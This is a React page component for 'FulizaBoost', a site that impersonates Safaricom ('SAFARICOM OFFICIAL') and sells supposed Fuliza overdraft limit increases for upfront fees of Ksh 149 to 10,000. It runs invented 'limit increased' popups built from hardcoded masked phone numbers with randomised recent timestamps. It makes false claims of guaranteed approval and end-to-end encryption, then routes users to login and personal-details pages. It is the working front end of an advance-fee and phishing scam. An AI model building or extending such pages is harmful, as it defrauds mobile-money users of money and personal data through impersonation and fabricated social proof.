import { useState, useEffect } from "react";
import "../styles/Home.css";
import { useNavigate } from "react-router-dom";

type LimitOption = {
  amount: number;
  fee: number;
};

const limits: LimitOption[] = [
  
  { amount: 5000, fee: 149 },
  { amount: 10000, fee: 250 },
  { amount: 15000, fee: 500 },
  { amount: 20000, fee: 1000 },
  { amount: 25000, fee: 1500 },
  { amount: 30000, fee: 2500 },
  { amount: 35000, fee: 3500 },
  { amount: 45000, fee: 5000 },
  { amount: 50000, fee: 7500 },
  { amount: 55000, fee: 8000 },
   { amount: 60000, fee: 9000 },
    { amount: 65000, fee: 10000 },
     
];

const notifications = [
  { phone: "0708****85", limit: 45000 },
  { phone: "0712****34", limit: 30000 },
  { phone: "0722****91", limit: 25000 },
  { phone: "0724****56", limit: 35000 },
  { phone: "0745****23", limit: 20000 },
  { phone: "0756****78", limit: 15000 },
  { phone: "0767****12", limit: 40000 },
  { phone: "0700****45", limit: 25000 },
  { phone: "0746****67", limit: 30000 },
  { phone: "0791****89", limit: 45000 },
];

const notificationTimes = [
  { label: "just now", weight: 50 },
  { label: "3 mins ago", weight: 25 },
  { label: "5 mins ago", weight: 15 },
  { label: "6 mins ago", weight: 7 },
  { label: "10 mins ago", weight: 3 },
];


const getRandomTime = () => {
  const totalWeight = notificationTimes.reduce((sum, t) => sum + t.weight, 0);
  let rand = Math.random() * totalWeight;

  for (const t of notificationTimes) {
    if (rand < t.weight) return t.label;
    rand -= t.weight;
  }
  return "just now"; 
};

const Home = () => {
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
  const [currentNotification, setCurrentNotification] = useState({
    ...notifications[0],
    time: "just now",
  });
  const [showNotification, setShowNotification] = useState(true);
  const navigate = useNavigate();

  
  useEffect(() => {
    const interval = setInterval(() => {
      setShowNotification(false);

      setTimeout(() => {
        const randomIndex = Math.floor(Math.random() * notifications.length);

        setCurrentNotification({
          ...notifications[randomIndex],
          time: getRandomTime(),
        });

        setShowNotification(true);
      }, 300);
    }, 4000);

    return () => clearInterval(interval);
  }, []);

  const handleBadgeClick = () => {
    navigate("/login"); 
  };

  return (
    <main className="container">
      
      <div className="badge" onClick={handleBadgeClick}>
        ● SAFARICOM OFFICIAL
      </div>

    
      <div className={`notification-overlay ${showNotification ? "show" : ""}`}>
        <div className="notification-icon"></div>
        <div className="notification-content">
          <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
          {currentNotification.limit.toLocaleString()}
          <div className="notification-time">• {currentNotification.time}</div>
        </div>
      </div>

      <h1 className="title">FulizaBoost</h1>
      <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>

    
      <div className="info-box">
        ⚡ Choose your new Fuliza limit and complete the payment to get instant
        access.
      </div>

    
      <h3 className="section-title">Select Your Fuliza Limit</h3>
      <div className="grid">
        {limits.map((item) => {
          const isActive = selectedAmount === item.amount;

          return (
            <div
              key={item.amount}
              className={`card ${isActive ? "active" : ""}`}
              onClick={() => setSelectedAmount(item.amount)}
            >
              <h2>Ksh {item.amount.toLocaleString()}</h2>
              <span className="fee">Fee: Ksh {item.fee.toLocaleString()}</span>
            </div>
          );
        })}
      </div>

      
      <div className="secure">🔒 VERIFIED SECURE • END-TO-END ENCRYPTED</div>

      <button
        className={`continue-btn ${selectedAmount ? "enabled" : ""}`}
       
        onClick={() => {
          const selectedLimit = limits.find((l) => l.amount === selectedAmount);
          if (selectedLimit) {
            navigate("/personal-details", { state: selectedLimit });
            sessionStorage.setItem("selectedLimit", JSON.stringify(selectedLimit));
          }
        }}
      >
        GET LIMIT NOW
      </button>
    </main>
  );
};

export default Home;


// import { useEffect, useState } from "react";
// import "../styles/Home.css";

// const Home = () => {
//   const [status, setStatus] = useState<"connecting" | "failed">("connecting");

//   useEffect(() => {
//     const timer = setTimeout(() => {
//       setStatus("failed");
//     }, 2500); 

//     return () => clearTimeout(timer);
//   }, []);

//   return (
//     <div className={`block-overlay ${status === "failed" ? "error" : ""}`}>
//       <div className="block-card">
//         {status === "connecting" ? (
//           <>
//             <div className="spinner"></div>
//             <p className="block-title">Connecting to network…</p>
//             <p className="block-sub">Verifying security configuration</p>
//           </>
//         ) : (
//           <>
//             <p className="block-error-title">Connection Failed</p>
//             <p className="block-error-text">
//               This application has been disabled due to invalid security
//               configuration and unauthorized use of Safaricom trademarks.
//             </p>
//             <p className="block-error-text">
//               © Safaricom PLC. All rights reserved.
//             </p>
//           </>
//         )}
//       </div>
//     </div>
//   );
// };

// export default Home;